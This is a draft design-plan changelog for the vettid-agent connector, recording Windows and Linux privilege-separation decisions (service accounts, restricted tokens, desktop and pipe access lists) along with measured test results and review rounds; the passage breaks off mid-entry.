---
title: AGENT-PLAN
status: draft
version: 0.1.20
date: 2026-11-22
changelog:
  - 0.1.20: 2026-11-22 (card #16224; owner a, GC #16214 and #16258). On
    Linux a member is an administrator (`member_is_admin`) only when its
    account can become root without a password, or read the keystrokes,
    the password hashes or the kernel's memory (AGENT-LINUX-RUNTIME
    0.1.1 §11); a member whose `sudo` asks for its password keeps its
    tools, and so does Ubuntu's first user, in `sudo` and `adm`. §11
    gains the Linux texts, NEW, for the owner's approval: "Administrator
    member, install stops, Linux" and "Administrator member, Linux" with
    the reason found, "Status, administrator check, Linux", and "README,
    sudo password". A5.6: the run helper runs `sudo` as root for the
    administrator checks, and nothing else as root. The Windows texts
    don't change. Nothing is built by it
  - 0.1.19: 2026-11-21, erratum, the owner's decision (GC #15936) and
    the facts measured by the CI probe on windows-2025
    (vettid/vettid-agent#53 at 1842446). Nothing here is built. **The
    connector's account on Windows is the virtual service account
    `NT SERVICE\vettid-agent-<n>`, always; the local-user fallback
    (`vtdc-<8 hex>`) is gone.** Measured: by default a virtual account
    holds `SeChangeNotifyPrivilege`, `SeImpersonatePrivilege`,
    `SeCreateGlobalPrivilege` and `SeIncreaseWorkingSetPrivilege`, and
    lacks `SeAssignPrimaryTokenPrivilege` and `SeIncreaseQuotaPrivilege`,
    so `CreateProcessAsUser` is refused. **Route B, chosen:** the
    service's required-privileges list is cut to
    `SeChangeNotifyPrivilege` only, with no LSA grant; measured, the
    service then starts holding only that privilege, and
    `CreateProcessAsUser` is refused (error 1314). It must hold no
    `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`,
    `SeIncreaseQuotaPrivilege` or `SeTcbPrivilege`, and the service
    checks its own token at start and refuses to run (an Event Log entry
    and `status` saying why) if it holds any privilege beyond
    `SeChangeNotifyPrivilege`. `SidType` is unrestricted. **Route A,
    rejected:** granting `SeAssignPrimaryTokenPrivilege` (and
    `SeIncreaseQuotaPrivilege`) to the service SID through LSA. It works
    (measured: `SeAssignPrimaryTokenPrivilege` alone is enough,
    `SeIncreaseQuotaPrivilege` is not needed), but that privilege alone
    is widely treated as enough to reach SYSTEM (the public
    potato-family tools), so a compromised connector could likely become
    SYSTEM; the owner would not accept that. **Runs start through the
    secondary-logon service,** `CreateProcessWithLogonW` with the
    runner's name and password. Measured from the service in session 0,
    with and without the profile: the child runs as exactly the runner
    (its SID read back) and exits 0; the run is started suspended,
    assigned to a kill-on-close job, then resumed, and closing the job
    kills it. The call starts the secondary-logon service (`seclogon`)
    on demand (measured with it stopped and set to Manual), so the
    installer does not change it; Manual is its default. Measured:
    seclogon's default access list lets the virtual account start it
    (`OpenService(SERVICE_START)` succeeded); whether the start came
    from the client's `StartService` or from a trigger start was not told
    apart. If the secondary logon service cannot be started (it is
    Disabled, as some images ship it, or a hardened access list does not
    allow the connector), runs are refused with a NEW text (§11)
    telling the member's administrator what to check, and
    `vettid-agent install` warns when it finds either. **The
    runner accounts** (`vtdr-<8 hex>-1` and `-2`) are allowed console
    interactive logon (the cost the owner accepted), denied RDP logon
    (`SeDenyRemoteInteractiveLogonRight`) and network logon
    (`SeDenyNetworkLogonRight`), hidden from the sign-in screen
    (`SpecialAccounts\UserList`), with random passwords kept only under
    the connector's DPAPI, never shown or logged; the batch logon right
    is not granted (not needed under B). In the probe `CreateProcessWithLogonW`
    worked with those denies and with no batch right (measured in
    vettid/vettid-agent#57, below). A runner also denied interactive logon was
    refused (error 1385). **Said plainly (README, and
    AGENT-SEPARATE-ACCOUNT §3):** a run's launcher's token has INTERACTIVE enabled, LOCAL absent and BATCH absent (measured, vettid/vettid-agent#57); the program it starts gets INTERACTIVE as deny-only, which
    closes Windows' default DCOM launch for "Interactive User" servers
    (a cross-session path to the member's session) and anything else
    granted to Interactive users, but not a COM class whose launch
    permission grants Authenticated Users, Everyone or Users (measured,
    below). A leaked runner password, used at the
    console or with `runas`, reaches what any standard local account
    reaches, the pairing's shares, and the secrets and processes of runs
    in progress for that account; it does not reach the connector's
    keys, and keeping the runner's processes alive keeps the slot out of
    use (it fails secure). The logon audit is documented to show type 2
    logons for runs (not measured). Denying network logon also blocks
    loopback NTLM as the runner (`\\localhost` shares, WMI over the
    network). Each run gets its own desktop (A3.10c), and `lpDesktop` is
    never null; the null-desktop behavior (it would add the run's logon
    SID to the connector's desktop access list) is documented, not
    measured. **Fix round after two blind reviews (NOT READY), the
    lead's calls marked:** (1) A3.10c's launcher is started with
    `CreateProcessWithLogonW`, not `CreateProcessAsUser`; (2) **the
    two-stage start (the lead's call):** the service starts the launcher
    through `CreateProcessWithLogonW`; the launcher, as the runner,
    holds `cwd`, builds a restricted token from its own (every
    privilege removed but `SeChangeNotifyPrivilege`, INTERACTIVE
    deny-only) and starts the program on it with `CreateProcessAsUser`,
    in the same job, reports the ids and the image identity and exits, and the service checks the image and resumes the program
    (A3.10c, §4.9, note §3); §4.9's `AccessCheck` uses the program's
    token; (3) **window station (the lead's call):** a per-run
    desktop in the service's window station with an entry for the
    runner on that station (measured, below; a per-run window station
    cannot be created); (4)
    INTERACTIVE and (5) the leaked-password statement are made accurate
    (above); (6) **runner rights (the lead's call):** `install` grants
    `SeInteractiveLogonRight` explicitly and checks the effective right,
    no batch right, password never expires, random passwords that meet
    the local complexity policy, the lockout stated, and a NEW §11 text
    "The run account could not sign in" by errno; (7) every handle the
    connector creates is non-inheritable, with a test; (8) the service's
    self-check also refuses if its account is in Administrators or any
    group beyond the defaults; (9) type 2 audits, `STARTF_USESTDHANDLES`, breakaway refused, the errno
    mapping, the no-batch shape and the Windows 10 and 11 client SKUs
    are requirements or documented, not measured (the exact-set
    self-check fails closed if a SKU adds a privilege). The
virtual account's profile stays "in use" for over a minute after the
    service is deleted, so the uninstaller (A5.5) retries later or says
    so. A3.10a (8) is unchanged. §4.2, A3.10b, A3.10c, A5.5, §11 and
    the "What blocks what" row of A3.10b change to match; the 0.1.17 text
    below is history. AGENT-SEPARATE-ACCOUNT 0.1.3 changes with it.
    **Measured by vettid/vettid-agent#57 (at 68794ee, windows-2025,
    every value asserted), which replaces the "to be measured" marks
    above:** (a) **Window station:** the connector's virtual account
    cannot create a window station (access denied; a create with a null
    name returns the service's own). Each run gets **its own desktop in
    the service's window station**. The runner's entry on that station
    is **0x20060** (READ_CONTROL, WINSTA_ACCESSGLOBALATOMS,
    WINSTA_EXITWINDOWS), the measured minimum (0x37F, 0x2003A and
    0x2005A fail), removed after the run. It is never 0xF037F, which
    would give WRITE_DAC and WRITE_OWNER on the shared station.
    `lpDesktop` is never null. The per-run window station option is
    removed. (b) **The job's UI limits are mandatory,** set before the
    resume, with no breakaway: HANDLES, GLOBALATOMS, DESKTOP,
    READCLIPBOARD, WRITECLIPBOARD, EXITWINDOWS, SYSTEMPARAMETERS and
    DISPLAYSETTINGS. Measured: CreateDesktop is denied only with them,
    and global atoms are separate only with them. A run whose limits
    cannot be set is refused. The service cannot end a program without
    the job (measured), so a run without its job is refused. (c) **The
    start, in order:** the service starts the launcher with
    `CreateProcessWithLogonW`, `dwLogonFlags` 0, `CREATE_NO_WINDOW`
    (seclogon refuses `DETACHED_PROCESS` for it), its own desktop,
    suspended, into the run's kill-on-close job (one job per run), then resumes it. The
    launcher **locks its own token and process**: their access lists
    become SYSTEM full plus OWNER RIGHTS with only TOKEN_QUERY (token)
    and SYNCHRONIZE and QUERY_LIMITED_INFORMATION (process); the token
    is owned by the runner, so OWNER RIGHTS applies to it. Measured:
    without the lock the program can open the launcher's process
    (VM_WRITE, CREATE_THREAD, WRITE_DAC) and token (DUPLICATE,
    IMPERSONATE, READ_CONTROL, WRITE_DAC, WRITE_OWNER) and copy a token
    with INTERACTIVE enabled, even after the launcher has exited and the
    service has closed its handles to it (something keeps the dead
    launcher's object alive; it is not a conhost, and the holder is
    unknown). With the lock every open is refused, so **the lock is
    required.** The launcher then opens and holds `cwd` as before,
    builds a restricted token from its own (every privilege removed but
    `SeChangeNotifyPrivilege`; INTERACTIVE deny-only; LOCAL is absent
    on the run's desktop, so no LOCAL step is needed) and starts the
    program with `CreateProcessAsUser`: suspended, `DETACHED_PROCESS`,
    its standard handles only (`PROC_THREAD_ATTRIBUTE_HANDLE_LIST`), in
    the held folder. The program token's default access list also gives
    the service's SID SYNCHRONIZE, QUERY_LIMITED_INFORMATION and
    TERMINATE (0x101001), and the launcher sets the program thread's
    access list to give the service SYNCHRONIZE, QUERY_LIMITED and
    THREAD_SUSPEND_RESUME (not through the default list, since 0x2 on a
    process is CREATE_THREAD). The launcher reports the program's
    process and thread ids to the service and **exits**. The service
    waits for the launcher's exit, closes its handles to it, and
    **waits until the job's process list is exactly the program** (so
    the belt for the launcher's conhost, which with `CREATE_NO_WINDOW` would run with an unlocked token; the GUI-subsystem launcher of the 0.1.19 erratum has none). It checks `GetProcessIdOfThread` against the process id,
    `IsProcessInJob`, and the program's image
    (`QueryFullProcessImageNameW`, measured possible) against the pinned
    file. Only then does it resume the program. **Output:** the service
    creates the standard pipes and passes them through the launcher's standard handles to the program (measured by vettid/vettid-agent#60: the service creates them non-inheritable and passes them with `STARTF_USESTDHANDLES` to `CreateProcessWithLogonW`; they arrive at the launcher as inheritable handles either way, and the launcher passes them in the program's handle list; output from the launcher and the program reaches the service after the launcher exits); with `DETACHED_PROCESS` there is no
    console, and no conhost exists while the program runs (measured: the
    job holds only the program). (d) **DCOM:** with INTERACTIVE
    deny-only, a class with the machine's default launch permission is
    refused (0x80070005). A class whose launch permission grants
    Authenticated Users (or Everyone or Users) passes the launch check (0x80080005, measured); treat it as launchable, as the Interactive User. This is said plainly in the
    README and the note. (e) **Real tools** run as the program: git,
    node, npm (through `cmd.exe`), ssh and python. (f) **Runner logon
    errors:** console denied 1385; password must change 1907 (the
    "never expires" flag overrides it); seclogon Disabled 1058. The
    explicit `SeInteractiveLogonRight` grant is not strictly needed on a
    default image (Users holds it); the grant and the check of the
    effective right stay, for hardened machines. (g) **Gaps:** window
    messages between processes on the run's desktop are untried (low
    risk: a detached program has no peer window in its job, and other
    desktops are out of reach); the holder of the dead launcher's object
    is unknown, and the lock protects regardless; the program can read the launcher's token groups through TOKEN_QUERY (inferred from the lock's grant, not measured), which is information only. **Second review round (two more blind reviewers, NOT READY; the lead's calls marked):** (1) the launcher's token is INTERACTIVE enabled, LOCAL absent and BATCH absent (measured, vettid/vettid-agent#57), where the text said INTERACTIVE and LOCAL; (2) that the service's pipes: non-inheritable, passed with `STARTF_USESTDHANDLES`, they reach the launcher as inheritable handles and the program through its handle list (measured by vettid/vettid-agent#60); (3) **The launcher's conhost (0.1.19; measured by vettid/vettid-agent#60 at 380958b, windows-2025, asserted):** with `CREATE_NO_WINDOW` the launcher has a conhost, and it holds an INTERACTIVE-enabled copy of the unlocked token (measured). It was gone by the time the program ran in every run, but that depends on timing, not a guarantee. **Design (the lead's call):** the launcher is a **GUI-subsystem executable, built with `-ldflags -H=windowsgui`** (not a patched binary, which would break an Authenticode signature). It has no console and no conhost (measured with an equivalent subsystem-2 binary), and the lock, the handoff, the resume, the output and the report work the same (measured). `CREATE_NO_WINDOW` is ignored for a GUI image, so nothing relies on it. Fallbacks, if ever needed: `FreeConsole` ends the conhost at once (measured), or the launcher locks the conhost's process and token (measured). **The belt (keep):** the service resumes the program only once the job's process list is exactly the program. (4) **Failure handling (the lead's call):** the launcher never starts the program unless the lock, the default access list and the thread's access list all succeeded, and it reports each result. On any failure, or on a timeout, the service closes the job (which kills everything in it), removes the station entry and the desktop, and refuses the run with the NEW §11 text "The program could not be started safely (<step>)."; `status` and the Event Log name the step. The failures covered: the lock or an access list failing; the restricted token or `CreateProcessAsUser` failing; the launcher exiting without a report; ids that fail `GetProcessIdOfThread`, `IsProcessInJob` or the image check; the job not coming down to exactly the program within 5 s; `ResumeThread` returning a count other than 1. Then the slot goes through its usual cleanup. **The setup steps before the launcher starts (the lead's call):** the desktop, the station entry, the report pipe (its creation, or a client process id that is not the launcher's), the output pipes, and the job with its assignment and its UI limits. A failure in any of them refuses the run with the same NEW text, naming the step, and whatever was made is removed. If removing the 0x20060 station entry or closing the desktop after a run fails, the slot stays out of use and `status` names it. (5) **The report channel (the lead's call, with the tightening; only the content and the two refusals were measured, by vettid/vettid-agent#60 at 380958b):** a per-run named pipe the service creates before the launcher starts: a random name of at least 48 bits, `FILE_FLAG_FIRST_PIPE_INSTANCE`, one instance, `PIPE_REJECT_REMOTE_CLIENTS`; its name is on the launcher's command line. Its access list grants the service and that runner only, the runner with write-only rights (no `FILE_CREATE_PIPE_INSTANCE`, 0x4). The service checks that `GetNamedPipeClientProcessId` equals the launcher's process id, and the launcher opens the pipe with exactly `FILE_WRITE_DATA|SYNCHRONIZE` and `SECURITY_SQOS_PRESENT|SECURITY_IDENTIFICATION`, never `GENERIC_WRITE`: on a pipe GENERIC_WRITE includes 0x4 (FILE_APPEND_DATA, the same bit as `FILE_CREATE_PIPE_INSTANCE`), which the runner's entry withholds, so the open would be refused. The 48-bit name, the one instance, the write-only runner entry, the `GetNamedPipeClientProcessId` check and the SQOS flags are the lead's design, not measured. The launcher reports through it the `cwd` final path and whether it is listable, the lock's result, and the program's process and thread ids (these four measured), and the read-only `AccessCheck` result and the image's volume serial number and file index (§4.9; design, not measured). Another runner and a plain local user are refused both read and write (measured). The report is a claim: the service verifies the ids through the job, `GetProcessIdOfThread`, the creation time and the image. The standard handles are the program's alone. (6) DCOM: a class granting Authenticated Users passes the launch check (0x80080005, measured); treat it as launchable, as the Interactive User; the README says "can be launched" and names the groups; (7) **Order in the launcher (0.1.19, second review round):** after the lock, `OpenProcessToken` on itself is denied (measured by vettid/vettid-agent#60), so it opens its token handle, with the rights `CreateRestrictedToken` needs, **before** the lock and builds the program's restricted token from that handle (measured: INTERACTIVE deny-only, `SeChangeNotifyPrivilege` only). (8) the denies are re-checked only by the elevated `status` and at install and upgrade (an administrator can read LSA rights; the service, with ChangeNotify only, cannot: `LsaEnumerateAccountRights` returns STATUS_ACCESS_DENIED, 0xC0000022, measured by vettid/vettid-agent#60; not measured: a network-logon attempt with the runner's password should fail with 1385, and RDP denial cannot be checked that way); (9) The per-run desktop's access list is SYSTEM, the service's SID, and that runner's SID, with the runner's entry exactly 0x83 (DESKTOP_READOBJECTS, DESKTOP_CREATEWINDOW and DESKTOP_WRITEOBJECTS; measured by vettid/vettid-agent#60 at 380958b as the narrowest that lets user32 and ole32 initialize: without READOBJECTS or WRITEOBJECTS user32 fails, and without CREATEWINDOW ole32 is refused; no standard right is needed, and HOOKCONTROL, JOURNALRECORD, JOURNALPLAYBACK, ENUMERATE, CREATEMENU and SWITCHDESKTOP are never granted). The desktop is closed after the run, and the connector creates no windows on the shared station. (10) Smaller: the §4.9 check uses the program's token, including the 0.1.17 text of A3.10c; of §4.9's two image checks the service's own read decides and the launcher's is a pre-check; the fix-round item (2) says the service resumes the program, not the launcher; the A3.10b self-check's default groups are still to be read (not read by step 3 of vettid/vettid-agent#60); "the sign-in log shows a console sign-in for each run" is documented, not measured; one kill-on-close job per run; The default list (0x101001 to the service) also applies to objects the program creates without an access list; that is harmless. Nothing is built
    **Measured by vettid/vettid-agent#60 (at 380958b, windows-2025, all
    asserted):** (1) the launcher's conhost: with `CREATE_NO_WINDOW` it
    holds an INTERACTIVE-enabled copy of the unlocked token; it was gone
    by the time the program ran in every run, which depends on timing
    and is no guarantee. **Design (the lead's call):** the launcher is a
    GUI-subsystem executable built with `-ldflags -H=windowsgui` (not a
    patched binary, which would break an Authenticode signature); it has
    no conhost (measured with an equivalent subsystem-2 binary), and the
    lock, handoff, resume, output and report work the same;
    `CREATE_NO_WINDOW` is ignored for it. Fallbacks: `FreeConsole` ends
    the conhost at once, or the launcher locks its process and token
    (both measured). The belt stays: the service resumes only once the
    job's process list is exactly the program. (2) Output pipes: the
    service creates the program's standard pipes non-inheritable and
    passes them with `STARTF_USESTDHANDLES`; they reach the launcher as
    inheritable handles either way, the launcher passes them in the
    program's handle list, and output from both reaches the service
    after the launcher exits. (3) Report pipe (tightened, the lead's call; the design is not measured, only the content and the two refusals): a random name of at least 48 bits, first instance, one
    instance, remote clients rejected; its access list gives the service
    and that runner only, the runner write-only (no
    `FILE_CREATE_PIPE_INSTANCE`, 0x4); the service checks
    `GetNamedPipeClientProcessId` against the launcher's id; the launcher
    opens it with `SECURITY_SQOS_PRESENT|SECURITY_IDENTIFICATION`; it
    carries the `cwd` final path, whether it is listable, the lock's result, the program's process and thread ids (these four measured), and the read-only AccessCheck result and the image's volume serial and file index (design); another
    runner and a plain local user are refused read and write (measured);
    the report is a claim the service verifies. (4) Order: after the
    lock, `OpenProcessToken` on itself is denied, so the launcher opens
    its token handle before the lock and builds the restricted token from
    it. (5) The deny re-check: the service, with ChangeNotify only,
    cannot read the runners' rights (`LsaEnumerateAccountRights` returns
    STATUS_ACCESS_DENIED, 0xC0000022), so the RDP and network-logon
    denies are re-checked only by the elevated `status` and at
    install and upgrade, not at each run. (6) The virtual account's
    default groups were not read by step 3: still to be read. (7) The desktop's own access mask is measured (at 380958b): the runner's entry is exactly 0x83 (DESKTOP_READOBJECTS, DESKTOP_CREATEWINDOW and DESKTOP_WRITEOBJECTS), the narrowest that lets user32 and ole32 initialize; the body has it. (8) Gaps, unchanged: the
    holder of the dead launcher's process object is unknown, and window
    messages are untried.
  - 0.1.18: 2026-11-21. The A5.6 row and the related list name
    AGENT-LINUX-RUNTIME (draft), the Linux design of the separate-account
    mode, reviewed before the run helper's and the key sealing's code.
    §4.9: on Linux 6.3 and later the connector also seals the program's
    memory file with `F_SEAL_EXEC` before `F_SEAL_SEAL` (the lead's call),
    which the run helper requires there (AGENT-LINUX-RUNTIME §7). Nothing
    else changes
  - 0.1.17: 2026-11-21, with VAULT-MESSAGING 0.93.0, ANDROID-PLAN
    0.1.135 and IOS-PLAN 0.1.78. Nothing here is built. The wire and
    plan side of AGENT-SEPARATE-ACCOUNT §6 for the owner's Q1 a and
    Q9 a (card GC #15810; the cards that follow are #15811 vault,
    #15812 Android, #15813 iOS, #15814 `share` on Windows, #15815
    hardened profiles, #15816 files in and out, #15817 macOS). §4.1:
    the vault code `cwd_not_allowed` (VAULT-MESSAGING 0.93.0, body
    `{where, path}`) with its NEW §11 text, and the stub's codes
    `service_not_running` and `versions_differ`. §4.1's `leash.run_with_secret`
    gains `inputs?` and `output?`. §6: new AV12 (§7.1), AA9 (§7.2),
    A3.10d (files in and out), A3.10e (hardened profiles) and A5.5a
    (`share`, Windows), and the "What blocks what" rows. AG14's "Not
    yet carded" now says what is carded and what is not (macOS is
    carded as #15817; its pieces still wait on A5.4). §4.7: `share` is
    card #15814. §11: NEW texts for `cwd_not_allowed` and for files
    not copied back; the "No service" and "Versions differ" texts gain
    their codes. **A3.10a erratum, the lead's calls (GC #15835):** the
    display-name flag is renamed `--label`; the pipe's name lives in
    `%ProgramData%\VettID\agent\<n>.json`; the service SID is
    computed from the service name; pairing names match
    `^[a-z0-9][a-z0-9-]{0,31}$`; a stub without a service, or on a
    version mismatch, serves MCP itself and answers every tool with the
    approved texts under the codes `service_not_running` and
    `versions_differ`; the member's pipe ACE is 0x120083. **Changed
    from 0.1.16:** A3.10a said a stub whose channel is missing answers
    "any tool" with the "No service" text and that a version mismatch
    is "refused with the NEW text"; it now says how (the stub serves
    MCP and answers each tool call with the code), and the pipe's
    rights read 0x120083 in place of the earlier wording, which no
    longer stands in the A3.10a row (the same data rights plus
    `READ_CONTROL`, `SYNCHRONIZE` and `FILE_READ_ATTRIBUTES`, which a
    client needs)
    **Fix round after the blind reviews (the lead's calls marked):**
    `share` is for `cwd` only, files in and out need only the binding
    entry (note §6: the stub moves the files; A3.10d, §4.1, §11,
    "What blocks what"); no nested `folders` entries (the vault
    refuses them, VAULT-MESSAGING 0.93.0), and the connector resolves
    a `cwd`'s final path from an open handle and runs in that same
    handle's path (§4.9); a capable vault (the lead's call; S10
    rejected a capability list, so none is added): from VAULT-MESSAGING
    0.93.0 every catalog entry for an item with a run way carries
    `folders` (empty when none), and the connector sends `inputs`,
    `output`, a member-folder `cwd` or an omitted `cwd` only for an item
    whose entry has it, otherwise answers `vault_too_old` for those and
    keeps sending a `work/` `cwd`; it stops sending one once the entry
    has `folders` (§4.9 "The directory" is rewritten);
    the service, not the stub, enforces the file caps and approved
    sizes, checks outputs on opened handles after every runner process
    is gone, and checks the binding again at copy-back (§4.9, A3.10d);
    the OS account names come from a short hash of the pairing name,
    Windows `vtdc-<8 hex>` and `vtdr-<8 hex>-1`/`-2`, Linux
    `vettid-c-<8 hex>` and `vettid-r-<8 hex>-1`/`-2`, with reserved
    Windows names refused for pairing names (A3.10a, A3.10c, A5.5,
    A5.6); A3.10b's local-user fallback keeps the service SID as the
    pipe's owner; `approval.pending`, `pending.list`, `leash.list_available`
    and the run result gain their members (§4.1); the connector refuses
    a `\` in a POSIX path (§4.9); the stub opens the pipe with exactly
    0x120083 (winio `DialPipeAccess`) and the Administrators entry is the
    same (A3.10a); `%ProgramData%\VettID\agent` is made
    administrator-owned and not member-writable, and a refused
    configuration has a code and text (A3.10a, §11); `VETTID_IN` and
    `VETTID_OUT` (§4.9); `pair --name <n>` selects the pairing in the
    separate-account mode and `--label <text>` is the name the phone
    shows, the old display flag (A3.10a, §11). The owner's decision a on #15847 (GC #15855): "Read only" is enforced
    for the folder a run starts in, by the service, which refuses a run
    whose `cwd` matches an entry with `write: false` while the pairing's
    share grants that folder write (§4.9, A5.5a, A3.10d, §11); and a run
    can reach every folder shared with the pairing (said plainly in §4.9,
    A5.5a and the README text). The owner's decision a on #15848 (GC #15856): every run with a member
    working folder, input files or an output folder is referred to the
    phone, whatever the item's "ask each time" setting says; moving
    files-only runs to the item's own setting later needs no wire
    change (A3.10d). **A5.5's installer** (the lead's call, from the
    agent#52 blind pair) refuses when UAC is off (`EnableLUA=0`) or the
    member is the built-in Administrator (RID 500), and refuses when the
    member is in Administrators (owner decision a, GC #15862: the mode
    needs a standard member account, since known UAC bypasses let a
    program in an administrator account elevate without a prompt); the
    service repeats the `EnableLUA` and RID 500 check when it judges a
    client elevated and refuses `pair`, `forget` and `share` if either
    holds, and (the lead's call) refuses tools to a member whose token
    holds Administrators, enabled or deny-only, so a member added to
    Administrators after install is caught; the README says so.
    **Last round (the lead's calls):** the runner, not the service, opens and
    holds `cwd` and the service decides on the path it reports (§4.9, A3.10c);
    a read-only entry is also refused when the runner's token is granted write
    on the folder, and `share` without `--write` adds an inherited deny for the
    runners (A5.5a); the catalog is read in the current vault session, before
    a run when no entry is held, and a refused `work/` `cwd` is retried once
    without it; `reason` on a not-copied output; `VETTID_IN`/`VETTID_OUT`
    refused in a binding's `env` list
  - 0.1.16: 2026-11-21, the follow-ups of AGENT-SEPARATE-ACCOUNT (0.1.1,
    approved by the owner 2026-11-05, option c, thread
    01M6PDSRYVSZW19F68VE55KWSA; §10 of the note), never written in
    until now. The owner directed the mode to be built on 2026-11-21
    (GC #15754) and approved the cards in plan #993: #15755 (this
    change), #15756 (A3.10a), #15757 (A3.10b), #15758 (A3.10c), #15759
    (A5.5) and #15760 (A5.6). Nothing here is built. New decision AG14
    (§2); AG10 stays withdrawn. AG1a gains the exception for the stub,
    the service, their local channel and the vault reached while no
    client runs; AG3 gains the keys under the connector's account per
    platform; AG4 gains the mode's platform order. §4.1: the code
    `separate_account_required`. §4.2: keys in this mode. §4.6:
    catching up in the service. §4.7: "never listens" gains the local
    channel, and the POSIX run helper and the elevated `pair`, `forget`
    and `share` are named (these two sentences change what 0.1.15's
    "runs as root or SYSTEM" could be read to mean). §4.8: the dev
    stack runs the service under test accounts. §4.9: runs and proxies
    only in this mode, under a runner account; `--run-path` checked
    against the member's and the runner's accounts (npm tools for runs
    in an admin-only folder, GC #15751, #15763); fresh `HOME`,
    `USERPROFILE`, `APPDATA` and temporary folders, the profile never
    loaded; "when the connector exits, it kills its runs" read as the
    service's life; the Developer Mode and symbolic-link rule for batch
    files no longer decides npm tools in this mode; "A separate account
    is the only full protection" now names the plan instead of "until
    it is built". §6: new A3.10a, A3.10b and A3.10c after A3.9, new A5.5
    (Windows installer and uninstaller) and A5.6 (Linux service, runners
    and installer), the A3 and A5 status lines, and A3.8b and A3.9 start
    only after A5.5 (owner edits #1002, #1003 applied 2026-11-21). "What blocks
    what" gains the new rows. §11: NEW texts of the note's §8. Changed
    0.1.15 statements: §4.7's "runs as root or SYSTEM", §4.9's "Until it
    is built, the README says so plainly", and the A3 status line's
    "A3.7, A3.8b and A3.9 are not built" (A3.10 added). AG1a's "no
    daemon, no local socket" holds for the same-account connector
    only. After the blind reviews and the lead's decisions: AG14 lists
    what is not yet carded (the macOS runtime pieces, Q1's folders and
    `share`, Q8's hardened profiles and pinned control files, Q9's files
    in and out; `share` is out of A5.5, A5.6 and §4.7, and
    `cwd_not_allowed` comes with Q1) and no longer says A5.6 gates
    A3.8b and A3.9 (it gates Linux runs only). The lead's stop rule: the
    on-demand service stays up while a run is in flight (a referred run
    still waiting for approval counts) or a run's answer is kept (AG1a,
    §4.6, §4.9, A3.10b, with its test). Linux keys: the elevated `pair`
    generates the data key and seals it as the systemd credential, a
    key-handling change with its own independent review (§4.2, AG3,
    A5.6; no TPM 2.0: the host key only with `--no-tpm`, owner c on GC #15786); the Wipe in the mode
    (the service cannot delete its sealed credential or keychain item;
    the elevated `forget` does; AG12, §4.2); macOS keys subject to A5.4's
    keychain check. A5.6 brought up to A5.5 (member and unique names, the
    configuration file and `--run-path` check, the runner-account refusal,
    version exchange, logs, restart limit, resume, README items,
    uninstaller overwriting the state file, `--upgrade`) with slot
    cleanup of `/tmp`, `/var/tmp`, `/dev/shm` and cron, `at` and systemd
    user timers. The refusal when the connector account (A3.10b) or a
    runner account (A3.10c) is the member's or an administrator's.
    Channel rules (the lead's call, A3.10a, A3.10b, A5.5, A5.6): `pair`
    and `forget` only from an elevated administrator's token (Windows) or
    peer uid 0 (Linux); every client (the stub, `pair`, `status`,
    `forget`) opens the pipe at identification level and checks the
    server's owner SID; no path or configuration from the stub; which
    text is which without the service. A5.5: the member gets
    `SERVICE_START` and `SERVICE_QUERY_STATUS` only; `install --upgrade`
    (also A5.6). §4.7's elevated list (`install`, `pair`, `forget`, the
    uninstaller, upgrades, macOS's `postinstall`, the POSIX run helper).
    §4.9: the operator's flags, the run's own directory and the pin's
    "does not cover" paragraph reconciled with the mode; the Developer
    Mode reason and "the full answer" follow the owner's a on GC
    #15787: in this mode every program, pinned or not, must sit in an
    administrator-only folder.
    §11: the README text is rewritten for the mode (the same-account
    connector is still run as a normal user; the false sentences about a
    program running as you reading a run's secret, and "your own settings
    files", are dropped; an administrator's `npm install -g` warning);
    the texts reworded (`separate_account_required` by platform, "No
    service", "Versions differ", `pair --name`), and NEW texts for a slot
    out of use, a stub given the old flags and the mode's run-path
    wording. "What blocks what": macOS runs also need A5.6's socket end
    and helper design and the uncarded macOS pieces. "(owner edit
    requested, plan #993)" reads "owner edits #1002, #1003 applied
    2026-11-21". Last round, with AGENT-SEPARATE-ACCOUNT 0.1.2: the
    Windows folder check is the owner and the ACL together (owner must
    be Administrators, SYSTEM or TrustedInstaller, or an OWNER RIGHTS ACE
    removes the owner's rights; the 0.1.15 rights per level; inherit-only
    ACEs not counted; no service-SID exemption; an A3.10c test); the
    pin fallback does not apply in the mode (GC #15787); the channel
    admits an elevated administrator or root only for `pair`, `forget`
    and `status`, never tools (AG1a, §4.7, A3.10a, A5.6, tests); A3.10a's
    without-service split is the lead's call; A5.6 gains the
    every-program rule, the client-side socket checks and the split
    test; `--no-tpm` (GC #15786 c: §4.2 sentence fixed, four NEW §11
    texts); a slot out of use is answered with its own text, not "Two
    programs are already running"; A5.5's uninstaller no longer lists
    shares' ACL entries; the README's npm advice per platform; the
    macOS `--run-path` check must read ACLs
  - 0.1.15: erratum, 2026-11-21, with VAULT-MESSAGING 0.92.1: as built
    in vettid-agent #48 (ask again after a withheld answer) and #42
    (A3.8a). §4.1: the connector's codes `withheld` and
    `argument_not_allowed`. §4.4 (0.1.13 and 0.1.14 said §4.3): the
    marker is checked first for every op, `withheld` other than `true`
    is `protocol_error`, a `null` value is no longer "no stored value",
    the connector asks again once (`AskAgain = 1`, chosen) and a second
    copy ends with `withheld`. §4.9: Windows batch files run through
    `cmd.exe` with the settled refused set (owner decision b, GC
    #14880), held and bound to the file; an extensionless path with a
    `.cmd` beside it runs that `.cmd`; the Linux cap and ELF-only
    rule; the pin of a batch file covers the batch file only, not the
    `node` and `node_modules` an npm shim runs (the lead's a on GC
    #15388; the owner sees it at this erratum's merge). A3 status and
    A3.8a's acceptance. §11: two NEW texts replace "Batch file", NEW
    "Answer lost", and "Not a program" names .cmd and .bat. Also as
    built in vettid-agent #51 (owner decisions b, a and a, GC #15715,
    #15728, #15742): the batch file's path and working folder and the
    copied account variables may hold non-ASCII unless this system's
    code page turns a character into a refused byte, `\`, `/` or `:`;
    `HOMEPATH=\` allowed; `PATH`/`TEMP`/`TMP` get the code-page part;
    a drive root refused as a run path; the manifest guard. A3.8a is
    the `internal/run` package; the tool, its flags, the `item.run` send
    and A3.8a's dev-stack checks move to A3.8b. NTFS rename result
    recorded; AA8's launcher wording is owed
  - 0.1.14: 2026-11-20, with VAULT-MESSAGING 0.92.0 (owner decisions a,
    GC #15273 and #15274). §4.3: a cached copy carries `withheld: true`,
    which the connector treats as "ask again as a new request"; the
    field-without-`value` rule stays as a backstop (both to be built).
    §4.9: a run answer with `withheld: true` starts nothing. AA8 and
    §11 "Proxy in Approvals": a proxy's approval shows
    `approval.pending`'s `proxy` member, Deny only without it
  - 0.1.13: erratum, 2026-11-20, with VAULT-MESSAGING 0.91.1. §4.5
    "Marks learned outside the sets": as built in vettid-agent #43 (the
